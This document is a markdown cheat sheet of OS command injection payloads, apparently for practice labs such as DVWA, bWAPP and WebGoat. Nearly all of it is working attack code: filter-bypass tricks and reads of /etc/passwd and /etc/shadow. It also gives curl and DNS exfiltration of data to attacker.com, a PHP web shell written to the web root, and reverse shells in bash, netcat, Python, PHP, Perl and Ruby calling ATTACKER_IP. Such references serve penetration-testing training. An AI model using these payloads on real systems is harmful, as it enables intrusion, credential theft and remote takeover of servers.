# Command Injection Hints & Cheat Sheet

Quick reference for OS command injection testing, payloads, and bypass techniques.

---

## Quick Payloads by Category

### Basic Command Separators (Unix)

```bash
# Semicolon - sequential
; id
; whoami
; cat /etc/passwd

# AND operator - runs if first succeeds
&& id
&& whoami

# OR operator - runs if first fails
|| id
|| whoami

# Pipe - pipe output
| id
| cat /etc/passwd

# Background
& id
& whoami

# Newline (URL encoded)
%0a id
%0d%0a id
```

### Basic Command Separators (Windows)

```cmd
# Ampersand - sequential
& whoami
& dir

# AND operator
&& whoami
&& ipconfig

# OR operator
|| whoami

# Pipe
| whoami
```

### Command Substitution

```bash
# Backticks
`id`
`whoami`
ping `whoami`.attacker.com

# $() syntax
$(id)
$(whoami)
ping $(whoami).attacker.com
```

---

## Platform-Specific Payloads

### DVWA

```bash
# Low Security
127.0.0.1; id
127.0.0.1; cat /etc/passwd
127.0.0.1 && whoami
127.0.0.1 | id

# Medium Security (semicolon and && filtered)
127.0.0.1 | id
127.0.0.1 | cat /etc/passwd

# High Security (pipe with space filtered)
127.0.0.1| id                    # No space before pipe
127.0.0.1|cat${IFS}/etc/passwd   # IFS for spaces
```

### bWAPP

```bash
# OS Command Injection
www.nsa.gov; id
www.nsa.gov; cat /etc/passwd
www.nsa.gov && whoami
www.nsa.gov | id

# Blind Command Injection
www.nsa.gov; sleep 5
www.nsa.gov; curl http://attacker.com/$(whoami)
www.nsa.gov; id > /var/www/bWAPP/output.txt
```

### Juice Shop

```bash
# Check API endpoints for injection points
# Time-based detection
; sleep 5
# Out-of-band
; curl http://attacker.com/$(whoami)
```

### WebGoat

```bash
# Command injection lessons
127.0.0.1 && whoami
127.0.0.1 && cat /etc/passwd

# Windows targets
127.0.0.1 & whoami
127.0.0.1 & dir
```

---

## Information Gathering Commands

### Unix/Linux

```bash
# System information
; uname -a
; cat /etc/os-release
; cat /proc/version
; hostname

# User information
; id
; whoami
; cat /etc/passwd
; cat /etc/shadow     # Requires root
; cat /etc/group
; w
; who

# Network information
; ifconfig
; ip addr
; ip route
; netstat -tuln
; netstat -antup
; ss -tuln
; arp -a
; cat /etc/hosts
; cat /etc/resolv.conf

# Process information
; ps aux
; ps -ef
; top -b -n 1

# File system
; pwd
; ls -la
; find / -name "*.conf" 2>/dev/null
; find / -perm -4000 2>/dev/null    # SUID files
; cat /etc/crontab
; ls -la /etc/cron*
```

### Windows

```cmd
# System information
& systeminfo
& hostname
& ver

# User information
& whoami
& whoami /all
& net user
& net localgroup administrators

# Network information
& ipconfig /all
& netstat -ano
& arp -a
& route print
& type C:\Windows\System32\drivers\etc\hosts

# File system
& dir C:\
& dir /s /b C:\*.txt
& type filename
```

---

## Filter Bypass Techniques

### Space Bypass

```bash
# Using $IFS (Internal Field Separator)
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}

# Using tabs
cat%09/etc/passwd

# Using brace expansion
{cat,/etc/passwd}

# Using < redirection
cat</etc/passwd
```

### Character Bypass

```bash
# Quote insertion
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# Variable insertion
c$()at /etc/passwd
c``at /etc/passwd

# Wildcard usage
cat /etc/pas*
cat /etc/p?sswd
cat /etc/pa[s]swd
```

### Keyword Bypass

```bash
# Case variation (some systems)
CAT /etc/passwd

# Variable substitution
a]a]a]a=cat;$a /etc/passwd

# Encoding
echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh

# Using printf
$(printf 'cat /etc/passwd')

# Concatenation
c'a't /etc/passwd
```

### Newline/Carriage Return

```bash
# URL encoded newline
%0a id
%0A id

# URL encoded carriage return + newline
%0d%0a id
%0D%0A id

# Tab
%09 id
```

### Comment Bypass

```bash
# Unix comments
; id #
; id %23    # URL encoded

# Windows comments
& whoami ::
```

---

## Blind Injection Techniques

### Time-Based Detection

```bash
# Unix sleep
; sleep 5
; sleep 10

# Using ping for delay
; ping -c 5 127.0.0.1    # 5 second delay
; ping -c 10 127.0.0.1   # 10 second delay

# Windows
& ping -n 5 127.0.0.1
& timeout 5
```

### Out-of-Band (OOB) Exfiltration

```bash
# DNS exfiltration
; nslookup $(whoami).attacker.com
; dig $(whoami).attacker.com
; host $(whoami).attacker.com

# HTTP exfiltration
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/$(whoami)
; curl http://attacker.com/?data=$(cat /etc/passwd | base64)

# File contents via DNS
; nslookup $(cat /etc/passwd | head -1 | base64).attacker.com
```

### Writing to Web Root

```bash
# Find web root
; find / -name "index.php" 2>/dev/null
; find / -name "index.html" 2>/dev/null

# Write to accessible location
; id > /var/www/html/out.txt
; cat /etc/passwd > /var/www/html/passwd.txt

# Create PHP shell
; echo '<?php system($_GET["c"]); ?>' > /var/www/html/s.php
```

---

## Reverse Shell Payloads

### Bash

```bash
; bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```

### Netcat

```bash
# With -e flag
; nc -e /bin/bash ATTACKER_IP PORT
; nc -e /bin/sh ATTACKER_IP PORT

# Without -e flag (more portable)
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
```

### Python

```bash
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP

```bash
; php -r '$sock=fsockopen("ATTACKER_IP",PORT);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl

```bash
; perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");system("/bin/sh -i");};'
```

### Ruby

```bash
; ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;system sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

---

## URL Encoding Reference

| Character | URL Encoded |
|-----------|-------------|
| Space | `%20` or `+` |
| `;` | `%3B` |
| `&` | `%26` |
| `\|` | `%7C` |
| `'` | `%27` |
| `"` | `%22` |
| `\n` | `%0A` |
| `\r` | `%0D` |
| Tab | `%09` |
| `#` | `%23` |
| `$` | `%24` |
| `(` | `%28` |
| `)` | `%29` |
| `` ` `` | `%60` |

---

## Quick Reference Tables

### Operators by OS

| Operator | Unix | Windows |
|----------|------|---------|
| Sequential | `;` | `&` |
| AND | `&&` | `&&` |
| OR | `\|\|` | `\|\|` |
| Pipe | `\|` | `\|` |
| Background | `&` | N/A |
| Newline | `\n` | `\n` |
| Substitution | `` `cmd` `` or `$(cmd)` | N/A |

### Common Commands

| Purpose | Unix | Windows |
|---------|------|---------|
| Username | `whoami` | `whoami` |
| User ID | `id` | `whoami /all` |
| Hostname | `hostname` | `hostname` |
| OS Info | `uname -a` | `systeminfo` |
| Network | `ifconfig` / `ip addr` | `ipconfig` |
| Connections | `netstat -tuln` | `netstat -ano` |
| Read file | `cat file` | `type file` |
| List files | `ls -la` | `dir` |
| Current dir | `pwd` | `cd` |

---

## Common Mistakes to Avoid

1. **Forgetting URL encoding** - Encode special characters in URLs
2. **Wrong operator for OS** - Windows uses `&` not `;`
3. **Not testing all operators** - Try multiple separators
4. **Ignoring output** - Check for errors/differences
5. **Missing time delays** - Use sleep for blind detection
6. **Not checking privileges** - Commands may fail due to permissions

---

## Troubleshooting Guide

| Problem | Possible Cause | Solution |
|---------|---------------|----------|
| No output | Blind injection | Use time-based or OOB |
| Command not found | Wrong path | Use full path `/bin/cat` |
| Syntax error | Encoding issue | URL encode special chars |
| Permission denied | Low privileges | Try different commands |
| Filter blocking | WAF/validation | Try bypass techniques |

---

## Tools Reference

```bash
# Commix - Automated OS command injection
commix -u "http://target.com/page?ip=127.0.0.1"
commix -u "http://target.com/page" --data="ip=127.0.0.1"
commix -u "http://target.com/page?ip=127.0.0.1" --os-shell

# Netcat listener
nc -lvnp 4444

# Python HTTP server (for exfiltration)
python3 -m http.server 8888

# Curl for manual testing
curl "http://target.com/page?ip=127.0.0.1%3Bid"
```

---

## OWASP References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP OS Command Injection Defense](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)

## Additional Resources

- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [HackTricks - Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [Reverse Shell Generator](https://www.revshells.com/)
